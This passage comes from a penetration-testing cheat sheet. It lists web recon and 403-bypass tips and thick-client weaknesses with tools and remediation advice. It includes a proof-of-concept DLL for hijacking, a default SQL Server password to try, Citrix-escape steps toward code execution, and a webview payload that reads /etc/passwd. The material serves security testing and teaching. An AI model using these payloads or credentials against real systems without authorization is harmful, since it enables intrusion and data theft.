- [DotGit](https://github.com/davtur19/DotGit) find if a website has `.git` exposed
- nuclei template `%USERPROFILE%\nuclei-templates\exposures\configs\git-config.yaml`
- [GitDumper from GitTools](https://github.com/internetwache/GitTools)



### <ins>Subdomain takeover</ins>

**Tools**
- [Can I take over XYZ?](https://github.com/EdOverflow/can-i-take-over-xyz)
- nuclei template `%USERPROFILE%\nuclei-templates\takeovers`



### <ins>4** Bypass</ins>
- [byp4xx](https://github.com/lobuhi/byp4xx), s/o to [m0pam](https://twitter.com/m0pam) for the tip
- Search for subdomain with subfinder. Httpx filters subdomains with a 403 response and prints their cname. Test the cname for a bypass
  `subfinder -d atg.se — silent | httpx -sc -mc 403 -cname`, s/o to [drak3hft7](https://twitter.com/drak3hft7) for the tip
- [403 Bypasser](https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122) Burp extension, test 403 bypasses on the run
- Replace `HTTP/n` with `HTTP/1.1`, `HTTP/2` or `HTTP/3`
- Change the request from `GET` to `POST` or viceversa


## Thick client vulnerabilities

### <ins>DLL Hijacking</ins>

**Tool**
- [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) to see which DLLs are missing for an exe and do DLL Hijacking

Using Process Monitor, add these the filters to find missing dlls.<br/><br/>
  <img src="https://github.com/seeu-inspace/easyg/blob/main/img/procmon-config-add.png" alt="procmon-config">

After that, insert the dll in the position of the missing ones with the same name. An example of a dll:

```c++
#include <windows.h>

BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        MessageBox(NULL,
            "success!!",
            "pwned",
            MB_ICONERROR | MB_OK
        );
        break;
    }

    return TRUE;
}
```

**Resources**
- [hijacklibs.net](https://hijacklibs.net/)
- [Save the Environment (Variable)](https://www.wietzebeukema.nl/blog/save-the-environment-variables)



### <ins>Insecure application design</ins>

The application design is based on a two-tier architecture. In particular, the thick client application installed on the workstation communicates directly with a backend DBMS without the use of an application server.

The best option, from a security perspective, is designing and implementing a three-tier architecture in which the thick client connects with an intermediary layer (an application server), which in turn communicates with the database. A secure channel must be used for all communications, with only secure protocols (such TLS, HTTPS, etc.), and preferebli with Certificate Pinning.

If this is not possible, it is desirable to provide read-only users and read/write users distinct privileges at the DBMS layer. This would stop vertical privilege escalation even if a read-only user were to access the database directly and try to edit the data.



### <ins>Weak Hashing Algorithms</ins>

Sensitive data exposure, key leakage, broken authentication, insecure sessions, and spoofing attacks can all be caused by improper application of encryption methods. Some hashing or encryption techniques, such MD5 and RC4, are known to be insecure and are not advised for use.

When dealing with hashing algorithms, the strongest algorithm available should be used (e.g., SHA-512 or at least SHA-256). However, it is always crucial to take into account the precise context in which the hashing algorithm must be used. For instance, it is recommended to utilize contemporary hashing algorithms that have been created especially for securely saving passwords when managing passwords. This indicates that they should be slow (as opposed to fast algorithms like MD5 and SHA-1), and that can be configured by changing the work factor (e.g., PBKDF2 or Bcrypt)

If not configured correctly, the encryption can be not sufficiently secure. An example with AES, an algorithm for symmetric encryption:
- Cipher-Block-Chaining (CBC) is no longer considered safe when verifiable padding has been applied without first ensuring the integrity of the ciphertext, except for very specific circumstances. If implemented, it can weakens AES encryption.



### <ins>Cleartext secrets in memory</ins>

The memory analysis of an application, done when the thick client process is running, can highlight the presence of secrets in cleartext and that can be therefore extracted by any user having access to the machine where the application is hosted.

**Resource**
- [Process Hacker](https://processhacker.sourceforge.io/) It helps to dump the exe memory and see what sensitive data is there



### <ins>Hardcoded secrets</ins>

Sometimes, the thick client application's source code is not obfuscated, therefore a hostile user may decompile it and easily comprehend every functionality of the application. It's also possible that more can be found, like credentials and api keys.

**Resources**
- [VB Decompiler](https://www.vb-decompiler.org/products.htm) decompile a VB application
- [ILSpy](https://github.com/icsharpcode/ILSpy) | [dnSpy](https://github.com/dnSpy/dnSpy) .NET decompilers



### <ins>Unsigned binaries</ins>

If an application executable, and/or the imported DLLs, has not been digitally signed, it's possible replace it with a tampered version without the user noticing.

**Resource**
- [Sigcheck](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck) check the signature of an executable



### <ins>Lack of verification of the server certificate</ins>

Due to the fact that the client does not verify the TLS certificate presented by the back-end, it's possible to intercept also HTTPS communications managed by the thick client application.

Without effective certificate control, an attacker who is capable of conducting a Man in the Middle attack can provide a self-signed certificate and the application will accept it, invalidating the protection provided by the TLS connection.



### <ins>Insecure SSL/TLS configuration</ins>

During the SSL/TLS negotiation, SSL/TLS connections may be set up to offer outdated protocols and cipher suites that are susceptible to known security flaws. The data transmitted between the server and the client could potentially be read or modified in this case if an attacker is able to intercept the communication.

**Resource**
- [testssl.sh](https://testssl.sh/) useful for checking outdated ciphers & more



### <ins>Remote Code Execution via Citrix Escape</ins>

If Citrix is present and you have access to it, there are multiple ways you can achieve Remote Code Execution:
- Try to upload a PowerShell
- Search for a functionality that opens a dialog box. Insert the path for `cmd` and `PowerShell` and see if they pop-up
- In a dialog box, see if the right-click is allowed. Play with the functionality to achieve RCE, like creating a `.bat` and running it or upload files
- Upload [Process Hacker](https://processhacker.sourceforge.io/) and see if you find [Cleartext secrets in memory](#cleartext-secrets-in-memory)

**Resources**
- [PowerShell](https://github.com/PowerShell/Powershell)
- [Two RCEs are better than one: write-up of an interesting lateral movement](https://medium.com/@seeu-inspace/two-rces-are-better-than-one-write-up-of-an-interesting-lateral-movement-66a52d42e075)



### <ins>Direct database access</ins>

- If it's found that standard users have direct access to the database, there is the possibility for users to read and write data that is not otherwise accessible through the client application.
- If the SQL server requires a Windows User access, use the command `runas /user:localadmin <SQL-SERVER-MANAGEMENT-STUDIO>`
- Try access with the account `sa:RPSsql12345`
- Intercept the requests and see if there is an [Insecure application design](#insecure-application-design). In that case, it might be possible to perform a Direct database access, SQLi or Remote Code Execution

**Resources**
- [Echo Mirage](https://resources.infosecinstitute.com/topic/echo-mirage-walkthrough/)
- [Wireshark](https://www.wireshark.org/)



### <ins>Insecure Windows Service permissions</ins>

Windows service executable might be configured with insecure permissions. Services configured to use an executable with weak permissions are vulnerable to privilege escalation attacks.

Unprivileged users have the ability to change or replace the executable with arbitrary code, which would then be run the following time the service is launched. This can lead to privilege escalation depending on the user the service is running as.



### <ins>Code injection</ins>
- Check for classic HTML injections and [XSS](cross-site-scripting-xss)
  - Try to use a `SSID` as a vector for an XSS
- Check if `<webview>` works. If it does, it's might be possible to achieve a LFI with a payload like this `<webview src="file:///etc/passwd"></webview>`. [[Reference](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)]


